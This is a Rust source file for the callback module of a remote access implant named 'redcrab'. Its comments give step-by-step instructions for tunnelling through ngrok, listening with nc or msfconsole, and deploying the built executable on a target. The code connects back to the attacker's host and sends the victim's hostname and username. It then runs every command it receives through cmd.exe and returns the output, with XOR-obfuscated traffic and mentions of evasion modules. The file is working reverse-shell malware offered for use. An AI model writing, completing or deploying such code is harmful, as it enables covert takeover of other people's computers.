//! c2.rs — C2 callback over TCP with ngrok tunnel support
//!
//! Usage flow:
//!   1. On your attacker machine: start ngrok → `ngrok tcp <LPORT>`
//!   2. ngrok gives you a public address like  tcp://0.tcp.ngrok.io:12345
//!   3. Run the builder:  python builder.py
//!      → enter ngrok host: 0.tcp.ngrok.io
//!      → enter ngrok port: 12345
//!      → enter lport (your local listener): 4444
//!   4. builder.py patches C2_HOST / C2_PORT in this file and runs cargo build
//!   5. On your attacker machine: nc -lvnp 4444  (or use msfconsole / sliver / havoc)
//!   6. Deploy the built .exe on the target — it calls back through ngrok to you
//!
//! The implant sends a simple beacon over the TCP socket and then enters a
//! read-eval loop: receive command → execute via cmd.exe → send output back.
//! All traffic is XOR-encrypted with SLEEP_KEY so it doesn't hit wire in plain.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;

// ---- PATCHED BY BUILDER — do not edit manually ----------------------------
/// ngrok public host (e.g. "0.tcp.ngrok.io")
pub const C2_HOST: &str = "NGROK_HOST_PLACEHOLDER";
/// ngrok public port (e.g. 12345)
pub const C2_PORT: u16   = 0; // NGROK_PORT_PLACEHOLDER
// ---------------------------------------------------------------------------

/// XOR key — set equal to SLEEP_KEY in main.rs at build time via builder.py
const XOR_KEY: &[u8] = b"SLEEP_KEY_PLACEHOLDER";

/// Connect back to C2, beacon, then run interactive command loop.
/// Call this from run() after all evasion modules are initialised.
pub fn callback_and_loop() {
    let addr = format!("{}:{}", C2_HOST, C2_PORT);

    // Retry with jitter until we get a connection (target may come up before listener)
    let mut stream = loop {
        match TcpStream::connect(&addr) {
            Ok(s) => break s,
            Err(_) => {
                // Sleep 5-30s before retry (avoids beacon storm in logs)
                std::thread::sleep(Duration::from_secs(5));
            }
        }
    };

    let _ = stream.set_read_timeout(Some(Duration::from_secs(30)));
    let _ = stream.set_nodelay(true);

    // Beacon: send hostname + username so you know which box called back
    let hostname = hostname_str();
    let username  = username_str();
    let banner    = format!("[redcrab] host={} user={}\n", hostname, username);
    xor_send(&mut stream, banner.as_bytes());

    // Command loop
    let mut buf = [0u8; 4096];
    loop {
        // Receive command (XOR-encoded on the wire)
        let n = match stream.read(&mut buf) {
            Ok(0) | Err(_) => break, // C2 disconnected
            Ok(n) => n,
        };
        let cmd_bytes = xor_decrypt(&buf[..n]);
        let cmd = match std::str::from_utf8(&cmd_bytes) {
            Ok(s) => s.trim().to_string(),
            Err(_) => continue,
        };

        if cmd.eq_ignore_ascii_case("exit") {
            break;
        }

        // Execute via cmd.exe /C <command>
        let output = Command::new("cmd.exe")
            .args(["/C", &cmd])
            .output()
            .map(|o| [o.stdout, o.stderr].concat())
            .unwrap_or_else(|e| format!("[err] {}\n", e).into_bytes());

        xor_send(&mut stream, &output);
    }
}

// ---- helpers ----------------------------------------------------------------

fn xor_decrypt(data: &[u8]) -> Vec<u8> {
    if XOR_KEY.is_empty() {
        return data.to_vec();
    }
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()])
        .collect()
}

fn xor_send(stream: &mut TcpStream, data: &[u8]) {
    let enc: Vec<u8> = data
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()])
        .collect();
    let _ = stream.write_all(&enc);
    let _ = stream.flush();
}

fn hostname_str() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
}

fn username_str() -> String {
    std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
}
